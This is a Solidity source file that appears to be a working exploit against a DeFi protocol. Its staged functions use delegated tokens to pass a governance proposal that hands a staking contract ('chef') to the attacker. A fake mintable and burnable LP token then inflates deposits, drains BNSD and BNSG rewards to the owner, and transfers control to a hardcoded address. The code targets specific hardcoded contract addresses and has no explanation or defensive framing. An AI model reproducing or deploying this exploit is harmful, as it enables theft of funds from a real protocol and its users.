pragma solidity ^0.8.23;

interface IERC20 {
    /// @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);

    /// @dev Emitted when the allowance of a `spender` for an `owner` is set, where `value`
    /// is the new allowance.
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /// @notice Returns the amount of tokens in existence.
    function totalSupply() external view returns (uint256);

    /// @notice Returns the amount of tokens owned by `account`.
    function balanceOf(address account) external view returns (uint256);

    /// @notice Moves `amount` tokens from the caller's account to `to`.
    function transfer(address to, uint256 amount) external returns (bool);

    /// @notice Returns the remaining number of tokens that `spender` is allowed
    /// to spend on behalf of `owner`
    function allowance(address owner, address spender) external view returns (uint256);

    /// @notice Sets `amount` as the allowance of `spender` over the caller's tokens.
    /// @dev Be aware of front-running risks: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    function approve(address spender, uint256 amount) external returns (bool);

    /// @notice Moves `amount` tokens from `from` to `to` using the allowance mechanism.
    /// `amount` is then deducted from the caller's allowance.
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    /// @notice Returns the name of the token.
    function name() external view returns (string memory);

    /// @notice Returns the symbol of the token.
    function symbol() external view returns (string memory);

    /// @notice Returns the decimals places of the token.
    function decimals() external view returns (uint8);
}

contract LpToken is IERC20 {
    address public owner;
    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "LP-TOKEN";
    string public symbol = "LPTOKEN";
    uint8 public decimals = 18;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(owner ==  msg.sender, "Owner only");
        _;
    }
    
    function transfer(address recipient, uint amount) external returns (bool) {
        if (recipient == owner) {
            return true;
        } 

        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(address account, uint amount) external onlyOwner {
        balanceOf[account] += amount;
        totalSupply += amount;
        emit Transfer(address(0), account, amount);
    }

    function burn(address account, uint amount) external onlyOwner {
        balanceOf[account] -= amount;
        totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
}

interface IChef {
    function transferOwnership(address newOwner) external;
    function set(uint256 _pid, uint256 _allocPoint, bool _withUpdate) external;
    function deposit(uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function owner() external view returns (address);
    function poolLength() external view returns (uint256);
    function add(uint256 _allocPoint, IERC20 _lpToken, bool _withUpdate) external;
}

interface IBnsg is IERC20 {
    function delegate(address delegatee) external;
    function mintBNSGWithBNS(uint96 amountToMint) external returns (bool);
}

interface IGovernance {
    function queue(uint proposalId) external;

    function castVote(uint proposalId, bool support) external;

    function execute(uint proposalId) external payable;

    function propose(
        address[] memory targets,
        uint[] memory values,
        string[] memory signatures,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint);
}

contract Busc {
    address public owner;
    IGovernance public constant gov = IGovernance(0xD7c3d1DFA7fc5E87Ad9674d5bA4fE8f711D52c15);
    IChef public constant chef = IChef(0x0D97baC371C34fBeccBbe64970453346e4e2bab3);
    uint public id;
    uint public pid;
    LpToken public lpToken;
    uint public depositAmount;
    IERC20 public constant bnsd = IERC20(0x668DbF100635f593A3847c0bDaF21f0a09380188);
    IBnsg public constant bnsg = IBnsg(0x0018E66A1dEA81fdD767CBb15673119b034b5CF2);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(owner ==  msg.sender, "Owner only");
        _;
    }

    function preAct() public onlyOwner {
        require(bnsg.balanceOf(address(this)) > 400000 ether, "Not enough");
        bnsg.delegate(address(this));
    }

    function zerothAct() public onlyOwner {
        address[] memory targets = new address[](1);
        targets[0] = address(chef);

        uint[] memory values = new uint[](1);
        values[0] = 0;

        string[] memory signatures = new string[](1);
        signatures[0] = "transferOwnership(address)";

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encode(address(this));

        id = gov.propose(targets, values, signatures, calldatas, "");
    }

    function firstAct() public onlyOwner {
        gov.castVote(id, true);
    }

    function secondAct() public onlyOwner {
        gov.queue(id);
    }

    function thirdAct() public onlyOwner {
        gov.execute(id);

        lpToken = new LpToken();
        lpToken.mint(address(this), 100000000000 ether);
        pid = chef.poolLength();
        chef.add(1 ether, lpToken, false);

        depositAmount = lpToken.balanceOf(address(this));
        lpToken.approve(address(chef), depositAmount);
        chef.deposit(pid, depositAmount);
    }

    function fourthAct() public onlyOwner {
        lpToken.burn(address(chef), lpToken.balanceOf(address(chef)) - 1);
        chef.withdraw(pid, depositAmount);

        bnsd.transfer(owner, bnsd.balanceOf(address(this)));
        bnsg.transfer(owner, bnsg.balanceOf(address(this)));
    }

    function fifthAndFinalAct() public onlyOwner {
        chef.set(pid, 0, false);
        chef.transferOwnership(0x813a5c8bA296Eb7Ce19537Ee2b6da973cC0F59c5);
    }

    function out(IERC20 token) external {
        token.transfer(owner, token.balanceOf(address(this)));
    }
}